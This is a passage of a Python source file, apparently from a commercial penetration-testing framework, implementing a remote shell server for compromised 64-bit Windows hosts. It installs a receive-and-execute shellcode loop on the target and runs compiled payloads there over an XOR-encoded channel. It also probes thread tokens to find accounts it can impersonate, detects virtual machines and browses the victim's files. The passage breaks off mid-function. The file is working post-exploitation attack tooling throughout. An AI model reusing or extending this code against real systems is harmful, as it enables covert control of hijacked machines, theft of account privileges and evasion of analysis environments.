"""
Win64 Shell Server
"""

import sys
if '.' not in sys.path:
    sys.path.append('.')

from shellserver import shellserver

import os
import time
import struct
import math
import logging

from shellcode.standalone.windows import secondstages64
from MOSDEF.win64remoteresolver import win64remoteresolver
from MOSDEFShellServer import MSSgeneric
from MOSDEF.mosdefutils import *
from exploitutils import *

from WindowsMosdefShellServer import WindowsMosdefShellServer

# globals for win64
# Copied from win32 globals, not sure if all values are the same on 64
O_RDONLY                            = 0x0
O_RDWR                              = 0x2
O_CREAT                             = 0x40
O_TRUNC                             = 0x200
AF_INET                             = 2
SOCK_STREAM                         = 1
SOCK_DGRAM                          = 2

MODE_ALL                            = 0x1ff # 777 (read, write, execute all, all, all)
# end globals

DUPLICATE_SAME_ACCESS               = 0x00000002
OF_READ                             = 0
OF_READWRITE                        = 2
OF_WRITE                            = 1

# CreateFile flags
FILE_SHARE_DELETE                   = 4
FILE_SHARE_READ                     = 1
FILE_SHARE_WRITE                    = 2
CREATE_NEW                          = 1
CREATE_ALWAYS                       = 2
OPEN_EXISTING                       = 3
OPEN_ALWAYS                         = 4
TRUNCATE_EXISTING                   = 8
GENERIC_READ                        = long(0x80000000L)
GENERIC_WRITE                       = 0x40000000
FILE_FLAG_BACKUP_SEMANTICS          = 0x2000000
FILE_NOTIFY_CHANGE_FILE_NAME        = 0x1
FILE_NOTIFY_CHANGE_DIR_NAME         = 0x2
FILE_NOTIFY_CHANGE_LAST_WRITE       = 0x10
FILE_LIST_DIRECTORY                 = 0x1

FILE_ATTRIBUTE_READONLY             = 0x00000001
FILE_ATTRIBUTE_HIDDEN               = 0x00000002
FILE_ATTRIBUTE_SYSTEM               = 0x00000004
FILE_ATTRIBUTE_DIRECTORY            = 0x00000010
FILE_ATTRIBUTE_ARCHIVE              = 0x00000020
FILE_ATTRIBUTE_ENCRYPTED            = 0x00000040
FILE_ATTRIBUTE_NORMAL               = 0x00000080
FILE_ATTRIBUTE_TEMPORARY            = 0x00000100
FILE_ATTRIBUTE_SPARSE_FILE          = 0x00000200
FILE_ATTRIBUTE_REPARSE_POINT        = 0x00000400
FILE_ATTRIBUTE_COMPRESSED           = 0x00000800
FILE_ATTRIBUTE_OFFLINE              = 0x00001000
FILE_ATTRIBUTE_NOT_CONTENT_INDEXED  = 0x00002000

# Service Manager
SC_MANAGER_ALL_ACCESS               = 0xF003F
SC_MANAGER_CONNECT                  = 0x01
SC_MANAGER_CREATE_SERVICE           = 0x02
SC_MANAGER_ENUMERATE_SERVICE        = 0x04
SC_MANAGER_LOCK                     = 0x08
SC_MANAGER_QUERY_LOCK_STATUS        = 0x10
SC_MANAGER_MODIFY_BOOT_CONFIG       = 0x20
SERVICE_QUERY_CONFIG                = 0x01
SERVICE_CHANGE_CONFIG               = 0x02
SERVICE_QUERY_STATUS                = 0x04
SERVICE_ENUMERATE_DEPENDANTS        = 0x08
SERVICE_CONTROL_STOP                = 0x01
SERVICE_START                       = 0x10
SERVICE_STOP                        = 0x20
SERVICE_PAUSE_CONTINUE              = 0x40
SERVICE_INTERROGATE                 = 0x80
SERVICE_USER_DEFINED_CONTROL        = 0x100
SERVICE_STOPPED                     = 0x01
SERVICE_START_PENDING               = 0x02
SERVICE_STOP_PENDING                = 0x03
SERVICE_USER_DEFINED_CONTROL        = 0x100
SERVICE_RUNNING                     = 0x04
SERVICE_CONTINUE_PENDING            = 0x05
SERVICE_PAUSE_PENDING               = 0x06
SERVICE_PAUSED                      = 0x07
SERVICE_ALL_ACCESS                  = 0xF01FF

SERVICE_STATE_ALL                   = 3
SERVICE_ACTIVE                      = 1
SERVICE_INACTIVE                    = 2
SERVICE_WIN32_OWN_PROCESS           = 0x10
SERVICE_WIN32_SHARE_PROCESS         = 0x20
SERVICE_WIN32                       = SERVICE_WIN32_OWN_PROCESS + SERVICE_WIN32_SHARE_PROCESS

SERVICE_FILE_SYSTEM_DRIVER          = 2
SERVICE_KERNEL_DRIVER               = 1
SERVICE_WIN32_OWN_PROCESS           = 0x10
SERVICE_WIN32_SHARE_PROCESS         = 0x20
SERVICE_INTERACTIVE_PROCESS         = 0x100

SERVICE_AUTO_START                  = 0x2 # started by SCM
SERVICE_BOOT_START                  = 0x0 # started by device manager at boot
SERVICE_DEMAND_START                = 0x3 # started using StartService
SERVICE_DISABLED                    = 0x4 # disabled
SERVICE_SYSTEM_START                = 0x1 # ioinitsystem started

# error control codes
SERVICE_ERROR_IGNORE                = 0
SERVICE_ERROR_NORMAL                = 1
SERVICE_ERROR_SEVERE                = 2
SERVICE_ERROR_CRITICAL              = 3

# memory constants
MEM_COMMIT                          = 0x1000
MEM_RESERVE                         = 0x2000
PAGE_EXECUTE_READWRITE              = 0x40

MOVEFILE_DELAY_UNTIL_REBOOT         = 0x4

# copied from win32mosdefshellserver (unfortunately lots of dup code here)
DRIVE_TYPES={"DRIVE_UNKNOWN" : 0, "DRIVE_NO_ROOT_DIR" : 1,
             "DRIVE_REMOVABLE" : 2, "DRIVE_FIXED" : 3,
             "DRIVE_REMOTE" : 4, "DRIVE_CDROM" : 5,
             "DRIVE_RAMDISK" : 6}

# registry
KEY_READ                             = 0x020019
KEY_WRITE                            = 0x02001a
KEY_QUERY_VALUE                      = 0x0001
KEY_SET_VALUE                        = 0x0002
KEY_CREATE_SUB_KEY                   = 0x0004
KEY_ENUMERATE_SUB_KEYS               = 0x0008
KEY_NOTIFY                           = 0x0010
KEY_CREATE_LINK                      = 0x0020
KEY_ALL_ACCESS                       = 0xf003fL
HKEY_CLASSES_ROOT                    = 0x80000000L
HKEY_CURRENT_USER                    = 0x80000001L
HKEY_LOCAL_MACHINE                   = 0x80000002L
HKEY_USERS                           = 0x80000003L
HKEY_PERFORMANCE_DATA                = 0x80000004L
HKEY_CURRENT_CONFIG                  = 0x80000005L
HKEY_DYN_DATA                        = 0x80000006L
SYNCHRONIZE                          = 0x00100000L

accessDict                           = {}
accessDict["KEY_ALL_ACCESS"]         = KEY_ALL_ACCESS
accessDict["KEY_QUERY_VALUE"]        = KEY_QUERY_VALUE
accessDict["KEY_SET_VALUE"]          = KEY_SET_VALUE
accessDict["KEY_READ"]               = KEY_READ
accessDict["KEY_WRITE"]              = KEY_WRITE
accessDict["KEY_ENUMERATE_SUB_KEYS"] = KEY_ENUMERATE_SUB_KEYS

keyDict                             = {}
keyDict["HKEY_LOCAL_MACHINE"]       = HKEY_LOCAL_MACHINE
keyDict["HKEY_CURRENT_USER"]        = HKEY_CURRENT_USER

TOKEN_DUPLICATE                     = 0x02
TOKEN_QUERY                         = 0x08

LOGON32_PROVIDER_DEFAULT            = 0
LOGON32_PROVIDER_WINNT35            = 1
LOGON32_PROVIDER_WINNT40            = 2
LOGON32_PROVIDER_WINNT50            = 3
LOGON32_LOGON_INTERACTIVE           = 2
LOGON32_LOGON_UNLOCK                = 7


class Win64_X64(WindowsMosdefShellServer, MSSgeneric, win64remoteresolver, shellserver):
    def __init__(self, connection, node, logfunction = None):
        win64remoteresolver.__init__(self)
        shellserver.__init__(self, connection, type = "Active", logfunction = logfunction)
        WindowsMosdefShellServer.__init__(self, "win64")
        MSSgeneric.__init__(self, 'X64')

        self.node           = node

        if self.node:
            self.node.shell = self

        self.connection     = connection
        self.startup_inited = False
        self.startup_finish = False
        self.started        = False
        self.log            = logfunction
        self.doxor          = False

        self.currentprocess = None
        self.cached_comspec = ""
        self.order          = intel_order
        self.unorder        = istr2int

        self.has_wow_64     = None  # Set in startup()
        self.is_wow_64      = False # By definition

        self.log("XOR Key set to 0x%2.2x"%self.xorkey)


    # keep the sendblock/sendint/etc. functions in here
    # because they are only used in Windows stuff ....
    def sendblock(self, data):
        return self.writebuf(struct.pack('<L',len(data)) + data)

    def sendstring(self, data):
        data += '\x00' # nul terminate
        return self.sendblock(data)

    def sendint(self, data):
        return self.writebuf(struct.pack('<L', data))

    def sendlonglong(self, data):
        return self.writebuf(struct.pack('<Q', data))

    def getprocaddress_withmalloc(self, procedure):
        """
        uses malloc/free for speed
        """
        library,procname = procedure.split("|")
        libaddr          = self.loadlibrarya(library)

        code = """

        // Remote resolving now happens via the local wrappers ...
        //
        // YOU SHOULD NEVER HAVE TO DO A REMOTE IMPORT IN MOSDEF-C Win64 CODE
        // If you need a function, add it to MOSDEFlibc/Win64 prototypes ...

        #import "local", "kernel32.dll|GetProcAddress" as "GetProcAddress"

        #import "local", "sendlonglong" as "sendlonglong"
        #import "local", "readstringfromself" as "readstringfromself"
        #import "local", "readlonglongfromself" as "readlonglongfromself"
        #import "local", "free" as "free"

        void main()
        {
            unsigned long long i;
            unsigned long long libaddr;
            char * procedure;

            procedure = readstringfromself();
            libaddr = readlonglongfromself();
            i = GetProcAddress(libaddr, procedure);
            sendlonglong(i);
            free(procedure);
        }
        """

        #self.savefunctioncache()
        self.clearfunctioncache()
        request = self.compile(code, {})
        #self.restorefunctioncache()
        self.sendrequest(request)
        self.sendstring(procname)
        self.sendlonglong(libaddr)

        ret = uint64(self.readlonglong())
        self.leave()
        if not ret:
            # XXX: hrmm ... raising exceptions like this is deprecated iirc
            raise Exception, "GetProcAddress for %s not found!" % procedure

        self.log("Getprocaddr_withmalloc: Found %s at %16.16x" % (procedure,ret))

        return ret

    def havemalloc(self):
        if ('kernel32.dll|GlobalAlloc' in self.remotefunctioncache.keys()
            and 'kernel32.dll|GlobalFree' in self.remotefunctioncache.keys()):
            return True
        return False

    def getprocaddress(self, procedure):
        if procedure in self.remotefunctioncache:
            # self.log('Returning cached function address: 0x%16.16x' %
            #         self.remotefunctioncache[procedure])
            return self.remotefunctioncache[procedure]

        logging.debug("%s not in cache - retrieving remotely." % procedure)

        if self.havemalloc():
            return self.getprocaddress_withmalloc(procedure)

        library,procname    = procedure.split("|")
        libaddr             = self.loadlibrarya(library)

        code = """
        #import "local", "kernel32.dll|GetProcAddress" as "GetProcAddress"

        #import "long long", "libaddr" as "libaddr"
        #import "string", "procedure" as "procedure"
        #import "local", "sendlonglong" as "sendlonglong"

        void main()
        {
            unsigned long long i;
            i = GetProcAddress(libaddr, procedure);
            sendlonglong(i);
        }
        """
        #self.savefunctioncache()
        self.clearfunctioncache()
        request = self.compile(code, { 'libaddr' : libaddr,
                                       'procedure' : procname })
        #self.restorefunctioncache()
        self.sendrequest(request)

        ret = uint64(self.readlonglong())
        self.leave()
        if not ret:
            raise Exception,"GetProcAddress for %s not found!"%procedure

        logging.debug("GetProcAddr: Found %s at %16.16x" % (procedure, ret))

        return ret

    # this is the entry point for the remote resolver into the shell server
    def getremote(self, f):
        a = self.getprocaddress(f)
        self.putremote(f, a)
        return a

    def putremote(self, f, a):
        # also done in cparse2, redundant?
        self.remotefunctioncache[f] = a
        return

    def loadlibrarya_withmalloc(self, library):
        code = """
        #import "local", "kernel32.dll|LoadLibraryA" as "LoadLibraryA"

        #import "local", "readstringfromself" as "readstringfromself"
        #import "local", "malloc" as "malloc"
        #import "local", "free" as "free"
        #import "local", "sendlonglong" as "sendlonglong"

        void main()
        {
            unsigned long long i;
            char * library;

            library = readstringfromself();
            i = LoadLibraryA(library);
            sendlonglong(i);
            free(library);
        }
        """
        #self.savefunctioncache()
        self.clearfunctioncache()
        #self.restorefunctioncache()

        request = self.compile(code, {})

        self.sendrequest(request)
        self.sendstring(library)
        ret = uint64(self.readlonglong())
        self.leave()

        self.log("Loadlibrary (with malloc) %s = %16.16x"%(library, ret))

        libraryp                            = library+"|"
        self.remotefunctioncache[libraryp]  = ret
        return ret

    def loadlibrarya(self, library):
        libraryp = library + "|" # pipe separator with nothing after it is the library
        if libraryp in self.remotefunctioncache:
            return self.remotefunctioncache[libraryp]

        if self.havemalloc():
            return self.loadlibrarya_withmalloc(library)

        code = """
        #import "local", "kernel32.dll|LoadLibraryA" as "LoadLibraryA"

        #import "string", "library" as "library"
        #import "local", "sendlonglong" as "sendlonglong"

        void main()
        {
            unsigned long long i;

            i = LoadLibraryA(library);
            sendlonglong(i);
        }
        """

        #self.savefunctioncache()
        self.clearfunctioncache()
        #self.restorefunctioncache()

        request = self.compile(code, {'library' : library })

        self.sendrequest(request)
        ret = uint64(self.readlonglong())
        self.leave()

        if ret == 0:
            logging.error("XXX: LoadLibrary(%s) failed!" % library)
            # XXX: do something here ...
        else:
            logging.debug("Loadlibrary %s = %16.16x" % (library, ret))
            self.remotefunctioncache[libraryp] =ret

        return ret

    # shellserver main entry point, flesh out as needed from here
    def startup(self):
        self.log('Win64 ShellServer ... booting')

        if self.startup_inited == True:
            while self.startup_finish == False:
                self.log('Waiting for startup to finish ...')
                time.sleep(1)
            return True

        if hasattr(self.connection, 'set_timeout') == True:
            self.connection.set_timeout(120)

        self.startup_inited = True
        # do startup here

        ss = secondstages64.SecondStages()
        # this sends
        # 1) SOCKET (QWORD)
        # 2) GETPROCADDRESS (QWORD)
        # 3) LOADLIBRARYA (QWORD)
        # 4) SEND (QWORD) / RECV (QWORD)
        # 5) WSAGETLASTERROR (QWORD)
        devlog("shellserver",ss.recvExecAllocLoop())
        self.sendrequest(
            ss.assemble(
                ss.recvExecAllocLoop()
            )
        )
        # eat the socket ... technically this is a DWORD
        # but for all intents and purposes it doesn't really matter ..
        self.log('Receiving SOCKET ...')
        self.fd = self.readlonglong()
        self.log('SOCKET Value : %X' % self.fd)

        # eat the addies
        self.log('Resolving needed function addresses ...')
        self.putremote('kernel32.dll|GetProcAddress', self.readlonglong())
        self.putremote('kernel32.dll|LoadLibraryA', self.readlonglong())
        self.putremote('ws2_32.dll|send', self.readlonglong())
        self.putremote('ws2_32.dll|recv', self.readlonglong())
        self.putremote('ws2_32.dll|WSAGetLastError', self.readlonglong())

        # leave ... releases the lock acquired in enter from sendrequest()
        self.leave()

        self.log('Resolved GetProcAddress: 0x%X' %
                 self.remotefunctioncache['kernel32.dll|GetProcAddress'])
        self.log('Resolved LoadLibrary: 0x%X' %
                 self.remotefunctioncache['kernel32.dll|LoadLibraryA'])
        self.log('Resolved WSAGetLastError: 0x%X' %
                 self.remotefunctioncache['ws2_32.dll|WSAGetLastError'])

        self.log('Initializing local libc functions ...')
        self.initLocalFunctions()

        # okay we have xorblock encode/decode liftoff on remote end now ...
        self.doxor = True

        # init the functions needed for malloc/free
        self.log('Resolving malloc/free ...')
        self.getprocaddress('kernel32.dll|GlobalAlloc')
        self.getprocaddress('kernel32.dll|GlobalFree')

        # to test ...
        self.log('Testing alloc/free resolver ...')
        self.getprocaddress('ws2_32.dll|select')
        self.log('Passed alloc/free resolver test!')

        #let's get the language of the remote system here.

        self.locale = self.getlocale() # returns a tuple
        self.log("Locale = %s"%repr(self.locale))

        #ok, let's RevertToSelf so token issues don't bite unsuspecting users
        self.SetThreadToken(0)

        # done
        self.startup_finish = True
        self.started        = True

        self.log('Win64 ShellServer ... Started')

        try:
            self.has_wow_64 = self.getprocaddress("kernel32.dll|IsWow64Process")
        except Exception, ex:
            self.log("Checked for IsWoW64Process, failed")
            self.has_wow_64 = False

        return True

    ##  Overriding these for XOR handling

    def xorblock(self, block):
        data = []
        for a in block:
            data += [chr(ord(a)^self.xorkey)]
        return "".join(data)

    def decode(self,data):
        " handles incoming encrypted/encoded data "
        if self.doxor == True:
            data = self.xorblock(data)
        return data

    def reliableread(self,length):
        if self.isapidict != {}:
            data = self.myexploit.webrecv(self.connection, size=length)
            data = self.decode(data)
            return data
        data        = ""
        datalist    = []
        readlength  = 0
        while readlength < length:
            tmp = self.node.parentnode.recv(self.connection, length-readlength)
            if tmp == "":
                self.log("Connection broken?!?")
                break
            readlength += len(tmp)
            datalist.append(tmp)
        data = "".join(datalist)
        data = self.decode(data)
        return data


    def readblock(self, fileobj=None):
        """
        Reads one block at a time...<int><buf>

        We read as much as we can off the socket, and if fileobj is
        an actual file, we write it directly into the file (after decoding it)
        otherwise, we return the data

        Having a file as an option allows us to grab huge chunks of data from
        the socket without storing them all in our memory. Storing everything
        in ram is a bad idea for SILICA or other memory-restricted environments.
        """
        data=[]
        tmp=""
        wanted=self.readint() #the size we are recieving
        #print "win32 readblock() wanted=%d"%wanted
        while wanted>0:
            #print "before recv %d"%wanted
            #cap the amount we recv in one go at 1024, in case we
            #have a particularally large number.
            #we don't want to use up all of our ram in this reliable recv
            recvsize=1024
            if wanted < recvsize:
                recvsize=wanted
            if self.isapidict!={}:
                tmp=self.myexploit.webrecv(self.connection,size=recvsize)
            else:
                tmp=self.node.parentnode.recv(self.connection,recvsize)
            #print "after recv %d"%len(tmp)
            if tmp=="":
                logging.error("Connection broken?")
                break
            #print "data+=%s"%prettyprint(tmp)
            #print "Data in readblock += len=%d"%len(tmp)
            if fileobj==None:
                data.append(tmp)
            else:
                fileobj.write(self.decode(tmp))
                fileobj.flush()
            wanted=wanted-len(tmp)
        data="".join(data)
        data=self.decode(data)
        #print "Done with readblock"
        #print data
        return data

    def localize_string(self, instr):
        """
	Make the string unicode if at all possible!
        For various information about encodings:
        http://docs.python.org/library/codecs.html#encodings-and-unicode
	"""
        devlog("win64" "win64 localize_string(): Raw string: %s"%repr(instr))
        if not self.locale:
            devlog("win64", "No locale found in localize_string()")
            return instr

        if len(self.locale)!=3:
            devlog("win64","self.locale seems munged: %s"%repr(self.locale))
            return instr

        #first try codepage
        from libs.unicode_utils import alias_mappings
        codepage=self.locale[2]
        if codepage and codepage in alias_mappings.keys():
            #try codepage translation (most likely to be correct)
            try:
                ret=instr.decode(alias_mappings[codepage])
                devlog("win64", "Decoded instring using %s"%codepage)
                return ret
            except:
                devlog("win64", "Failed to decode lang %s using codec %s"%(self.locale, codepage))
                #this is very strange

        return instr

    def getlocale(self):
        """
        Gets the codepage of this CANVAS Win64 Node.
        This is important for hacking machines that are not in English.

        References:

        http://msdn.microsoft.com/en-us/library/dd318107(VS.85).aspx
        http://msdn.microsoft.com/en-us/library/dd373814(VS.85).aspx

        inputs: none
        outputs: returns the Locale we use as a tuple
        """

        variables={}

        code="""
        #import "local", "kernel32.dll|GetLocaleInfoA" as "GetLocaleInfoA"
        #import "local","sendstring" as "sendstring"
        #import "local","sendint" as "sendint"


        void main() {
          int ret;
          char outbuf[5000];
          //LOCALE_USER_DEFAULT = 0x400
          //LOCALE_NAME_USER_DEFAULT = 0 ?
          //LOCALE_SISO3166CTRYNAME = 0x5A
          //LOCALE_SISO639LANGNAME = 0x59
          //LOCALE_IDEFAULTANSICODEPAGE 0x1004
          //LOCALE_IDEFAULTCODEPAGE 11 //OEM code page (more useful)
          ret=GetLocaleInfoA(0x400,0x59,outbuf,4999);
          sendint(ret);
          if (ret!=0) {
            sendstring(outbuf);
          }

          ret=GetLocaleInfoA(0x400,0x5A,outbuf,4999);
          sendint(ret);
          if (ret!=0) {
            sendstring(outbuf);
          }

          ret=GetLocaleInfoA(0x400,11,outbuf,4999);
          sendint(ret);
          if (ret!=0) {
            sendstring(outbuf);
          }

        }
        """
        self.clearfunctioncache()
        request=self.compile(code,variables)
        self.sendrequest(request)

        langname=""
        countryname=""
        codepage=""
        ret=self.readint()
        retbuffer=""
        final=""
        if ret:
            retbuffer=self.readstring()
            final+=retbuffer
            langname=retbuffer
        else:
            self.log("Could not get locale LANGNAME!")

        ret=self.readint()
        retbuffer=""
        if ret:
            retbuffer=self.readstring()
            final+="_"+retbuffer
            countryname=retbuffer
        else:
            self.log("Could not get locale COUNTRYNAME!")

        ret=self.readint()
        retbuffer=""
        if ret:
            retbuffer=self.readstring()
            #self.log("Codepage: %s"%retbuffer)
            codepage=retbuffer
        else:
            self.log("Could not get locale Codepage!")

        self.leave()
        return (langname,countryname,codepage)


    def SetThreadToken(self,token,thread=0):
        """
        Sets the thread token (0 for reverttoself)
        thread is actually supposed to be a pointer to a thread...
        on fail returns 0
        """
        #set primary token if we are none
        if token==None:
            token=0

        vars={}
        vars["thread"] = thread
        vars["token"] = token

        self.clearfunctioncache()
        request=self.compile("""
        #import "local", "advapi32.dll|SetThreadToken" as "SetThreadToken"
        #import "local","sendint" as "sendint"
        #import "long long", "thread" as "thread"
        #import "long long", "token" as "token"

        //start of code
        void main()
        {
           int i;
           i=SetThreadToken(thread, token);
           sendint(i);
        }
        """,vars)

        self.sendrequest(request)
        result=sint32(self.readint())
        self.leave()
        return result!=0

    def checkvm(self):
        "checks if we're inside a VM by checking for a relocated idt"
        self.log("[!] Checking if we're inside a VirtualMachine")
        vars = {}
        code = """
        #import "local", "sendint" as "sendint"
        #import "local", "checkvm" as "checkvm"

        void
        main()
        {
            int i;
            i = checkvm();
            sendint(i);
        }
        """

        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret = self.readint()
        self.leave()
        devlog("checkvm", "checkvm sent back a %d"%ret)

        # Decide what to do based on the value returned
        # various known VMWare/etc values
        vm_values = [0xd0, 0xff, 0xe8, 128, 0x02, 0x00]

        if ret in vm_values:
            ret = 1
            self.log("[!] Looks like we're on virtual hardware :)")
        else:
            ret = 0
            self.log("[!] Looks like we're on real hardware :)")


        return ret


    def IsWow64Process(self, pid=None):
        """
        Returns True if we are a 32 bit process on a 64 bit platform
        http://msdn.microsoft.com/en-us/library/ms684139(VS.85).aspx

        If PID = None, check current process otherwise process with PID.
        An Exception will be raised for the 2nd case if OpenProcess fails
        on target PID.
        """

        vars = {}

        if pid is None:
            # Use current PID
            code = """
            #import "local", "kernel32.dll|IsWow64Process" as "IsWow64Process"
            #import "local", "kernel32.dll|GetCurrentProcess" as "GetCurrentProcess"
            #import "local", "sendint" as "sendint"

            void main()
            {
                int i;
                int ret;
                ret = IsWow64Process(GetCurrentProcess(), &i);
                sendint(i);
            }
            """
            self.clearfunctioncache()
            request = self.compile(code,vars)
            self.sendrequest(request)
            ret = self.readint() #true or false
            self.leave()
            if ret: return True
            return False

        # Get a handle to process with target PID and query that
        vars['PID'] = pid

        code = """
        #import "local", "kernel32.dll|IsWow64Process" as "IsWow64Process"
        #import "local", "kernel32.dll|OpenProcess" as "OpenProcess"
        #import "local", "kernel32.dll|CloseHandle" as "CloseHandle"
        #import "local", "sendint" as "sendint"
        #import "int",   "PID" as "PID"

        void main()
        {
            int i;
            int ret;
            long long pHandle;

            // PROCESS_QUERY_INFORMATION needs to be set
            pHandle = OpenProcess(0x0400, 0, PID);

            if (pHandle == 0) {
                sendint(0);
                return;
            }

            sendint(1);

            ret = IsWow64Process(pHandle, &i);
            ret = CloseHandle(pHandle);
            sendint(i);
        }
        """

        self.clearfunctioncache()
        request = self.compile(code, vars)
        self.sendrequest(request)
        ret = self.readint()

        if ret == 0:
            self.log('OpenProcess error, aborting..')
            self.leave()
            raise Exception('OpenProcess error')

        ret = self.readint()
        self.leave()
        if ret: return True
        return False


    def create_thread_ex_check(self):
        """
        Return True if NtCreateThreadEx is available.
        False otherwise.
        """
        code = """
        #import "local", "kernel32.dll|GetProcAddress" as "GetProcAddress"
        #import "local", "kernel32.dll|GetModuleHandleA" as "GetModuleHandleA"
        #import "local", "sendint" as "sendint"

        void main()
        {
            if (GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx")) {
                sendint(1);
            } else {
                sendint(0);
            }

            return;
        }
        """

        return True if self.node.shell.runCode(code, {}) == 1 else False


    def getthreadsinfo(self,maxtoken=0xf00):
        """
	Goes through each thread token and sends back some information about it!
	"""
        self.log("Get threads information - starting")
        vars={}
        #XXX: Technically this should be the W form of this function
        code="""
        #import "local", "secur32.dll|GetUserNameExA" as "GetUserNameExA"
        #import "local", "advapi32.dll|SetThreadToken" as "SetThreadToken"
        #import "local","sendstring" as "sendstring"
        #import "local","sendint" as "sendint"
        #import "local","memset" as "memset"
        #import "local","sendlonglong" as "sendlonglong"

        void main() {
          int ret;
          char outbuf[1000];
          int len;
          int NameFormat;
          long long token;
          long long thread;

          NameFormat=2; //NameSamCompatible

          token=0;
          thread=0;
          while (token<MAXTOKEN) {
             ret=SetThreadToken(thread,token);
             if (ret!=0) {
                 sendint(1);
                 sendlonglong(token);
                 memset(outbuf, 0 , 1000);
                 len=1000;
                 GetUserNameExA(NameFormat,outbuf,&len);
                 sendstring(outbuf);
             }
             token=token+4;
          }
          sendint(-1);
        }
        """.replace("MAXTOKEN","0x%x"%maxtoken)
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=0
        results=[]
        while ret != -1:
            ret=sint32(self.readint())
            retbuffer=""
            if ret != -1:
                token=self.readlonglong()
                retbuffer=self.readstring()
                results.append((token,retbuffer))
        self.leave()
        self.log("Found %d thread tokens"%len(results))
        return results

    def read_uni_string(self):
        """
	Read a UTF-16-le string from the remote host
	"""
        devlog("win64","Reading unicode string from remote host")
        ret=self.readblock()
        #check to see if we have a double null at the end (we don't want null terminators internally)
        if ret[-2:]=="\x00\x00":
            ret=ret[:-2]
        ret=ret.decode("utf_16_le")
        return ret

    def GetDrives(self):
        """
        Get list of drives and their types and (TODO: free space)
        """

        vars={}
        self.clearfunctioncache()
        request=self.compile("""
        //start of code
        #import "local","sendint" as "sendint"
        #import "local","kernel32.dll|GetLogicalDriveStringsW" as "GetLogicalDriveStringsW"
        #import "local","kernel32.dll|GetDriveTypeW" as "GetDriveTypeW"

        #import "local","kernel32.dll|GlobalAlloc" as "GlobalAlloc"
        #import "local","kernel32.dll|GlobalFree" as "GlobalFree"
        #import "local","msvcrt.dll|wcslen" as "wcslen"
        #import "local","debug" as "debug"
        #import "local","senddata2self" as "senddata2self"

        void main()
        {
            //should be plenty (famous last words)
            short * buffer;
            char * p;
            short currentchar;
            int i;
            long long len;
            int drive_type;

            //debug();
            i=GetLogicalDriveStringsW(0, 0); //Get size
            i=i+1;
            buffer=GlobalAlloc(0x40, i*2); //allocate enough space
            i=GetLogicalDriveStringsW(i, buffer); //Get actual buffer
            //i is the size of the used buffer in bytes
            p=buffer;
            currentchar=*p;
            while (currentchar != 0 ) {
                sendint(1); //about to send a string!
                senddata2self(p,1); //these are really just one char

                //now get type
                drive_type=GetDriveTypeW(p);
                sendint(drive_type);


                //now increment pointer. A little weird because of MOSDEF. wcslen(p)*2 fails. :<
                len=wcslen(p);
                len=len*2;
                p=p+len;
                p=p+2; //past null
                currentchar = *p;
            }
            sendint(0); // done sending drive strings
            GlobalFree(buffer);
        }
        """,vars)

        self.sendrequest(request)
        #print "Sent request"
        sending_drive_string=self.readint()
        devlog("win64", "sending_string=: %d"%sending_drive_string)
        drives=[]
        while sending_drive_string:
            drive_string=self.readblock()
            drive_string += ":\\"
            devlog("win64", "Got drive_string: %s"%drive_string)
            drive_type=self.readint()

            #now replace with a string
            for key in DRIVE_TYPES.keys():
                if DRIVE_TYPES[key]==drive_type:
                    drive_type=key
                    break

            drives+=[(drive_string,drive_type)]
            sending_drive_string=self.readint()
            devlog("win64", "sending_string=: %d"%sending_drive_string)

        self.leave()

        return drives

    def GetDrive(self):
        code = """
        #import "local", "msvcrt.dll|_getdrive" as "_getdrive"
        #import "local", "sendint" as "sendint"
        void main()
        {
            int ret;
            ret = _getdrive();
            sendint(ret);
            return;
        }
        """

        self.clearfunctioncache()
        request=self.compile(code, {})
        self.sendrequest(request)
        ret=self.readint()
        self.leave()
        return ret

    def mkdir(self, dirname):
        vars = {}
        vars["dirname"] = dirname

        code = """
        #import "local", "msvcrt.dll|_mkdir" as "_mkdir"
        #import "local", "sendstring" as "sendstring"
        #import "string", "dirname" as "dirname"
        void main()
        {
            int ret;
            ret = _mkdir(dirname);
            sendint(ret);
            return;
        }
        """

        self.clearfunctioncache()
        request=self.compile(code, vars)
        self.sendrequest(request)
        ret=self.readint()
        self.leave()
        return ret


    def getcwd(self):
        """
        inputs: none
        outputs: returns the current working directory as a string
        """
        vars={}
        self.clearfunctioncache()
        request=self.compile("""
        #import "local", "kernel32.dll|GetCurrentDirectoryW" as "GetCurrentDirectoryW"
        #import "local","senddata2self" as "senddata2self"
        #import "local","memset" as "memset"
        #import "local", "kernel32.dll|GetLastError" as "GetLastError"
        #import "local", "sendint" as "sendint"

        //start of code
        void main()
        {
           int i;
           char dest[1060];
           memset(dest, 0, 1060);
           i=GetCurrentDirectoryW(500,dest);
           sendint(i);
           if (i!=0) {
               //i has the length of the string in characters.
               senddata2self(dest,500); //in bytes, not characters - should include terminating null
               }
           else {
               i=GetLastError();
               sendint(i);
           }
        }
        """,vars)

        self.sendrequest(request)
        charnum=sint32(self.readint())
        if charnum == 0:
            errno=sint32(self.readint())
            devlog("win32", "errno from getcwd: %d"%errno)
            ret=""
        else:
            #read the buffer
            ret=self.readblock()
        self.leave()
        #print "Ret=%s"%repr(ret)
        #ret is a Wide Character buffer we need to translate into a unicode string - utf16
        try:
            ret=ret.decode("utf_16_le")[:charnum]
        except:
            devlog("win32","getcwd can't translate %s into unicode!"%repr(ret))

        return ret

    def do_cd(self, dest):
        """
        Used from commandline shell.
        """
        return self.cd(dest)

    def chdir(self, directory):
        if type(directory)==type(""):
            devlog("win64","Converting from ascii chdir")
            directory = directory.decode('utf-8')

        if type(directory)==type(u''):
            #we are unicode
            return self.chdirW(directory)
        else:
            devlog("win64", "Unknown type %s for chdir!"%type(directory))
        return -1

    def chdirW(self, directory):
        """
	Unicode supporting change of working directory
        inputs: the directory to chdir into
        outputs: returns -1 on failure, otherwise 0
	"""
        devlog("win64","Changing into unicode directory %s"%directory)
        try:
            #encode in windows-friendly format
            directory=directory.encode("utf-16-le")+"\x00\x00"
        except:
            devlog("win64", "Failed to encode directory %s!"%directory)

        vars={}
        vars["dir"]=directory
        self.clearfunctioncache()
        request=self.compile("""
        //start of code
        #import "local","sendint" as "sendint"
        #import "local","kernel32.dll|SetCurrentDirectoryW" as "SetCurrentDirectoryW"
        #import "string","dir" as "dir"
        #import "local","debug" as "debug"

        void main()
        {
        int i;
        //debug();
        i=SetCurrentDirectoryW(dir); //return 0 on failure
        sendint(i);
        }
        """,vars)

        self.sendrequest(request)
        #print "Sent request"
